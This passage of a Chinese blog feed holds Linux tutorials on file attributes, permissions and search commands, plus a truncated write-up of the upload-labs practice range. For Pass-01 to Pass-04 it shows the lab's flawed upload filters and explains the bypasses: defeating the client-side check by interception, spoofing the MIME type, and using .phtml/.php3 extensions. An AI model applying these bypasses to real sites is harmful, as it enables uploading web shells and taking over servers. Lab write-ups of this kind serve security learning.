可就很厉害了！他可以让一个档案『不能被删除、改名、设定连结也无法</span><br><span class="line">     写入或新增资料！』对于系统安全性有相当大的帮助！只有 root 能设定此属性</span><br><span class="line">s  ：当档案设定了 s 属性时，如果这个档案被删除，他将会被完全的移除出这个硬盘</span><br><span class="line">     空间，所以如果误删了，完全无法救回来了喔！</span><br><span class="line">u  ：与 s 相反的，当使用 u 来配置文件案时，如果该档案被删除了，则数据内容其实还</span><br><span class="line">     存在磁盘中，可以使用来救援该档案喔！</span><br></pre></td></tr></table></figure><h3 id="1-设置文件隐藏属性：chattr命令"><a href="#1-设置文件隐藏属性：chattr命令" class="headerlink" title="1.设置文件隐藏属性：chattr命令"></a>1.设置文件隐藏属性：chattr命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chattr [+-=][ASacdistu] 档案或目录名称</span><br><span class="line">选项与参数：</span><br><span class="line">+   ：增加某一个特殊参数，其他原本存在参数则不动。</span><br><span class="line">-   ：移除某一个特殊参数，其他原本存在参数则不动。</span><br><span class="line">=   ：设定一定，且仅有后面接的参数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# chattr +i test3</span><br><span class="line">root@ubuntu:~/tmp# rm test3</span><br><span class="line">rm: cannot remove `test3&apos;: Operation not permitted</span><br></pre></td></tr></table></figure><p>由于对文件test3附加了<code>i</code>的隐藏属性，所以无法删除</p><h3 id="2-显示文件隐藏属性：lsattr命令"><a href="#2-显示文件隐藏属性：lsattr命令" class="headerlink" title="2.显示文件隐藏属性：lsattr命令"></a>2.显示文件隐藏属性：lsattr命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsattr [-adR] 档案或目录</span><br><span class="line">选项与参数：</span><br><span class="line">-a ：将隐藏文件的属性也秀出来；</span><br><span class="line">-d ：如果接的是目录，仅列出目录本身的属性而非目录内的文件名；</span><br><span class="line">-R ：连同子目录的数据也一并列出来！</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# lsattr test3</span><br><span class="line">----i--------e- test3</span><br></pre></td></tr></table></figure><h2 id="六-观察文件类型：file命令"><a href="#六-观察文件类型：file命令" class="headerlink" title="六.观察文件类型：file命令"></a>六.观察文件类型：file命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# file ~/.bashrc </span><br><span class="line">/root/.bashrc: ASCII English text</span><br><span class="line">root@ubuntu:~/tmp# file /usr/bin/passwd</span><br><span class="line">/usr/bin/passwd: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xc101d30ff4513f2dbad17fcc483dcda4a38e1df0, stripped</span><br></pre></td></tr></table></figure><h2 id="七-命令与文件的查找"><a href="#七-命令与文件的查找" class="headerlink" title="七.命令与文件的查找"></a>七.命令与文件的查找</h2><h3 id="1-脚本文件的查找：which命令"><a href="#1-脚本文件的查找：which命令" class="headerlink" title="1.脚本文件的查找：which命令"></a>1.脚本文件的查找：which命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">which [-a] command</span><br><span class="line">选项与参数：</span><br><span class="line">-a：将所有由PATH目录中科院找到的命令均列出，而不止第一个被找到的命令名称</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/tmp# which passwd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">root@ubuntu:~/tmp# which ls</span><br><span class="line">/bin/ls</span><br><span class="line">root@ubuntu:~/tmp# which cd</span><br></pre></td></tr></table></figure><p>可以发现有的命令是找不到的，因为which是默认找<strong>PATH内所规范的路径，去查找执行文件的文件名</strong></p><h3 id="2-文件的查找：whereis，locate-updatedb，find命令"><a href="#2-文件的查找：whereis，locate-updatedb，find命令" class="headerlink" title="2.文件的查找：whereis，locate/updatedb，find命令"></a>2.文件的查找：whereis，locate/updatedb，find命令</h3><p><code>whereis</code>由一些特定的目录查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whereis [-bmsu] 文件或目录名</span><br><span class="line"> </span><br><span class="line">-b 　只查找二进制文件。</span><br><span class="line">-B&lt;目录&gt; 　只在设置的目录下查找二进制文件。</span><br><span class="line">-f 　不显示文件名前的路径名称。</span><br><span class="line">-m 　只查找说明文件。</span><br><span class="line">-M&lt;目录&gt; 　只在设置的目录下查找说明文件。</span><br><span class="line">-s 　只查找原始代码文件。</span><br><span class="line">-S&lt;目录&gt; 　只在设置的目录下查找原始代码文件。</span><br><span class="line">-u 　查找不包含指定类型的文件。</span><br></pre></td></tr></table></figure><p><code>locate</code>是在已建立的数据库<strong>/var/lib/mlocate</strong>里面的数据所查找到的，不用再去硬盘当中读取数据，所以较为快速，数据库默认一天更新一次，如果要手动更新数据库，需要输入<code>updatedb</code>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">locate [-ir] keyword</span><br><span class="line"></span><br><span class="line">-i：忽略大小写的差异</span><br><span class="line">-l：仅输出几行的意思</span><br></pre></td></tr></table></figure><p><code>find</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# find /var -mtime +4 #+4代表大于等于5天前的文件</span><br><span class="line">root@ubuntu:~/tmp# find /var -mtime -4 #-4代表小于等于4天内的文件</span><br><span class="line">root@ubuntu:~/tmp# find /var -mtime 4  #4-5那一天的文件</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Linux
    
    </summary>
    
      <category term="Linux" scheme="https://Foxgrin.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://Foxgrin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux的文件权限与目录配置</title>
    <link href="https://Foxgrin.github.io//posts/26833/"/>
    <id>https://Foxgrin.github.io//posts/26833/</id>
    <published>2019-03-06T10:16:00.000Z</published>
    <updated>2019-03-14T12:00:06.873Z</updated>
    
    <content type="html"><![CDATA[<p>Linux一般将文件可读写的身份分为3个类别，分别是拥有者（owner），所属群组（group），其他人（others），且三种身份各有读（read），写（write），执行（execute）等权限。<a id="more"></a></p><h2 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h2><h3 id="1-文件拥有者"><a href="#1-文件拥有者" class="headerlink" title="1.文件拥有者"></a>1.文件拥有者</h3><p>即用户，通常分为<strong>root</strong>和一般身份的用户，所有用户的相关信息都记录在<strong>/etc/passwd</strong>这个文件内，用户的密码则是记录在<strong>etc/shadow</strong>文件中</p><h3 id="2-用户组"><a href="#2-用户组" class="headerlink" title="2.用户组"></a>2.用户组</h3><p>用户组中有若干用户，组名记录在<strong>/etc/group</strong>文件中</p><h3 id="3-其他人"><a href="#3-其他人" class="headerlink" title="3.其他人"></a>3.其他人</h3><h2 id="Linux文件权限概念"><a href="#Linux文件权限概念" class="headerlink" title="Linux文件权限概念"></a>Linux文件权限概念</h2><h3 id="1-Linux文件属性"><a href="#1-Linux文件属性" class="headerlink" title="1.Linux文件属性"></a>1.Linux文件属性</h3><p>使用<code>ls -al</code>命令查看当前目录下的所有文件（包括以<code>.</code>开头的隐藏文件）和目录及其相关属性与权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ls -al</span><br><span class="line">total 64</span><br><span class="line">drwx------ 11 root root 4096 Mar  5 19:43 .</span><br><span class="line">drwxr-xr-x 24 root root 4096 Apr  8  2018 ..</span><br><span class="line">-rw-------  1 root root  391 Mar  5 22:59 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Apr  8  2018 .cache</span><br><span class="line">drwx------  6 root root 4096 Apr  8  2018 .config</span><br><span class="line">drwx------  3 root root 4096 Dec 30 00:28 .dbus</span><br><span class="line">drwx------  2 root root 4096 Apr 23  2018 .gconf</span><br><span class="line">drwx------  2 root root 4096 Apr  8  2018 .gvfs</span><br><span class="line">drwxr-xr-x  3 root root 4096 Apr  8  2018 .local</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 15  2018 .oracle_jre_usage</span><br><span class="line">-rw-r--r--  1 root root  140 Apr 19  2012 .profile</span><br><span class="line">drwx------  2 root root 4096 Dec 29 22:32 .pulse</span><br><span class="line">-rw-------  1 root root  256 Apr  8  2018 .pulse-cookie</span><br><span class="line">drwxr-xr-x  3 root root 4096 May 15  2018 .swt</span><br><span class="line">-rw-------  1 root root  858 Mar  5 19:43 .viminfo</span><br></pre></td></tr></table></figure><p>以<strong>.config</strong>文件为例说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drwx------    6    root  root  4096  Apr  8  2018 .config</span><br><span class="line">[    1    ]  [2]   [3]   [4]   [5]   [    6    ]   [  7  ]</span><br></pre></td></tr></table></figure><p>信息分为7栏，每栏的意义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[1]：文件类型权限</span><br><span class="line">[2]：链接数</span><br><span class="line">[3]：文件拥有者</span><br><span class="line">[4]：文件所属用户组</span><br><span class="line">[5]：文件大小</span><br><span class="line">[6]：文件最后被修改的时间</span><br><span class="line">[7]：文件名</span><br></pre></td></tr></table></figure><h4 id="第一栏：文件类型权限"><a href="#第一栏：文件类型权限" class="headerlink" title="第一栏：文件类型权限"></a>第一栏：文件类型权限</h4><p>共有<strong>十个</strong>字符</p><p><strong>第一个</strong>字符代表这个文件是<strong>目录，文件或链接文件</strong>等</p><p><code>[d]</code>代表目录，<code>[-]</code>代表文件，<code>[l]</code>表示链接文件</p><p>接下来的字符，以<strong>三个</strong>为<strong>一组</strong>，且均为<code>[rwx]</code>的三个参数的组合，其中<code>[r]</code>代表<strong>可读</strong>（read），<code>[w]</code>代表<strong>可写</strong>（write），<code>[x]</code>代表<strong>可执行</strong>（execute），如果没有权限则会出现减号<code>[-]</code>。第一组代表<strong>文件拥有者可具备的权限</strong>，第二组代表<strong>加入此用户组之账号的权限</strong>，第三组代表<strong>非本人且没有加入本用户组的其他账号的权限</strong></p><p>十个字符整理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr--</span><br></pre></td></tr></table></figure><p>意义是这是一个文件，文件拥有者具有可读，可写和可执行的权限。同用户组的用户具有可读和可执行的权限，其他用户具有只读的权限</p><h4 id="第二栏：链接数"><a href="#第二栏：链接数" class="headerlink" title="第二栏：链接数"></a>第二栏：链接数</h4><p>每个文件都会讲它的权限与属性记录到文件系统的<strong>inode</strong>中，这个属性记录的就是有多少不同的文件名链接到同一个inode中</p><h4 id="第三栏：文件的拥有者"><a href="#第三栏：文件的拥有者" class="headerlink" title="第三栏：文件的拥有者"></a>第三栏：文件的拥有者</h4><h4 id="第四栏：文件所属的用户组"><a href="#第四栏：文件所属的用户组" class="headerlink" title="第四栏：文件所属的用户组"></a>第四栏：文件所属的用户组</h4><p>在Linux系统中，你的账号会加入一个或多个用户组中，假如用户组具有可读可写权限，则该用户组中的每个用户都具有可读可写权限</p><h4 id="第五栏：文件大小"><a href="#第五栏：文件大小" class="headerlink" title="第五栏：文件大小"></a>第五栏：文件大小</h4><p>默认单位为<strong>Bytes</strong></p><h4 id="第六栏：文件创建日期或最后被修改的日期"><a href="#第六栏：文件创建日期或最后被修改的日期" class="headerlink" title="第六栏：文件创建日期或最后被修改的日期"></a>第六栏：文件创建日期或最后被修改的日期</h4><h4 id="第七栏：文件名"><a href="#第七栏：文件名" class="headerlink" title="第七栏：文件名"></a>第七栏：文件名</h4><h3 id="2-修改文件属性与权限"><a href="#2-修改文件属性与权限" class="headerlink" title="2.修改文件属性与权限"></a>2.修改文件属性与权限</h3><p><code>chgrp</code>：修改文件所属用户组</p><p><code>chown</code>：修改文件拥有者</p><p><code>chmod</code>：修改文件权限</p><h4 id="修改所属用户组"><a href="#修改所属用户组" class="headerlink" title="修改所属用户组"></a>修改所属用户组</h4><p>使用<code>chgrp</code>命令，前提是修改的用户组必须在<strong>/etc/group</strong>文件中存在才行，命令格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chgrp groupname dirname/filename</span><br><span class="line">root@ubuntu:~# chgrp test .config</span><br></pre></td></tr></table></figure><h4 id="修改文件拥有者"><a href="#修改文件拥有者" class="headerlink" title="修改文件拥有者"></a>修改文件拥有者</h4><p>使用<code>chown</code>命令，前提修改的用户必须在<strong>/etc/passwd</strong>文件中存在才行，命令格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chown 账号名称 文件或目录</span><br><span class="line">root@ubuntu:~# chown 账号名称：用户组名称 文件或目录</span><br><span class="line">root@ubuntu:~# chown test01 .config</span><br><span class="line">root@ubuntu:~# chown test01:test .config</span><br></pre></td></tr></table></figure><h4 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h4><p>使用<code>chmod</code>命令，设置方法有两种，分别可以用数字或是符号来进行权限的修改</p><h5 id="数字类型修改文件权限"><a href="#数字类型修改文件权限" class="headerlink" title="数字类型修改文件权限"></a>数字类型修改文件权限</h5><p>各权限的数字对照表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r：4</span><br><span class="line">w：2</span><br><span class="line">x：1</span><br></pre></td></tr></table></figure><p>每种身份（owner，group，others）各自的三个权限（r，m，x）数字是需要<strong>累加</strong>的，例如当权限为：<code>[-rwxrwx---]</code>数字则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">owner = rwx = 4+2+1 = 7</span><br><span class="line">group = rwx = 4+2+1 = 7</span><br><span class="line">others = --- = 0+0+0 = 0</span><br></pre></td></tr></table></figure><p>所以我们设置权限时，该文件的权限数字就是<strong>770</strong>，chmod语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chmod xyz 文件或目录</span><br><span class="line">root@ubuntu:~# chmod 777 .config</span><br></pre></td></tr></table></figure><h5 id="符号类型修改文件权限"><a href="#符号类型修改文件权限" class="headerlink" title="符号类型修改文件权限"></a>符号类型修改文件权限</h5><p>格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chmod 身份 权限操作 权限 文件或目录</span><br></pre></td></tr></table></figure><p>参数具体为：</p><p>（1）身份：<code>u</code>即user，<code>g</code>即用户组，<code>o</code>即其他人，<code>a</code>代表全部身份</p><p>（2）权限操作：<code>+</code>即加入，<code>-</code>即移除，<code>=</code>即设置</p><p>（3）权限：<code>rmx</code></p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chmod u=rwx,go=rx .config</span><br></pre></td></tr></table></figure><h3 id="3-目录与文件的权限意义"><a href="#3-目录与文件的权限意义" class="headerlink" title="3.目录与文件的权限意义"></a>3.目录与文件的权限意义</h3><h4 id="权限对文件的意义"><a href="#权限对文件的意义" class="headerlink" title="权限对文件的意义"></a>权限对文件的意义</h4><p>r（read）：可读取此文件的实际内容</p><p>w（write）：可以编辑，新增或是修改该文件的内容（但不含删除该文件）</p><p>x（execute）：该文件具有可以被系统执行的权限</p><h4 id="权限对目录的意义"><a href="#权限对目录的意义" class="headerlink" title="权限对目录的意义"></a>权限对目录的意义</h4><p>r（read）：表示具有读取目录结构列表的权限，如使用ls命令将该目录的内容列表显示出来</p><p>w（write）：具有改动该目录结构列表的权限</p><p>x（execute）：用户具有进入该目录的权限，如使用cd命令进入某个目录列表</p>]]></content>
    
    <summary type="html">
    
      Linux
    
    </summary>
    
      <category term="Linux" scheme="https://Foxgrin.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://Foxgrin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞--upload-labs</title>
    <link href="https://Foxgrin.github.io//posts/49857/"/>
    <id>https://Foxgrin.github.io//posts/49857/</id>
    <published>2019-03-02T14:05:00.000Z</published>
    <updated>2019-03-05T12:03:57.574Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传练习靶场–upload-labs通关记录以及对文件上传漏洞的总结<a id="more"></a></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>直接上传php文件，出现弹框提示上传失败</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>尝试抓包，但是因为弹框未抓到上传文件的包，所以猜测是前端JS代码对文件进行了检测，直接查看网页源代码，发现检测JS代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">"请选择要上传的文件!"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span></span><br><span class="line"><span class="javascript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span></span><br><span class="line"><span class="undefined">            alert(errMsg);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码大致流程是对比文件名的最后一个后缀是否是jpg,png,gif，如果不是则前端拦截文件，上传失败。</p><p>既然是前端进行，我们只要绕过前端，再利用抓包修改文件名后缀，即可成功上传PHP文件。我们先上传一个后缀名为JPG，内容为PHP代码的文件<strong>1cmd.jpg</strong>，再通过抓包修改文件名为<strong>1cmd.php</strong>，过程如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>直接上传PHP文件，提示文件类型错误，猜测后台代码对文件类型进行了检测，抓包修改文件类型为<strong>image/jpeg</strong>，如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>本关检测代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>上传PHP文件，提示禁止不允许上传.asp,.aspx,.php,.jsp后缀文件 ，尝试修改文件名为<strong>.jpg.php</strong>，修改文件类型，大写PHP，都失败，猜测后台代码将文件名的最后一个”.”后作为检测目标。后台过滤代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了后缀名为.asp,.aspx,.php,.jsp的文件，但是没有过滤<strong>phtml</strong>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传成功<a href="http://127.0.0.1/upload-labs/upload/201903031949124726.phtml" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/upload/201903031949124726.phtml</a></p><p>另外修改后缀名为<strong>php3</strong>也可以</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>上传php，phtml，php3等文件都失败，过滤代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span 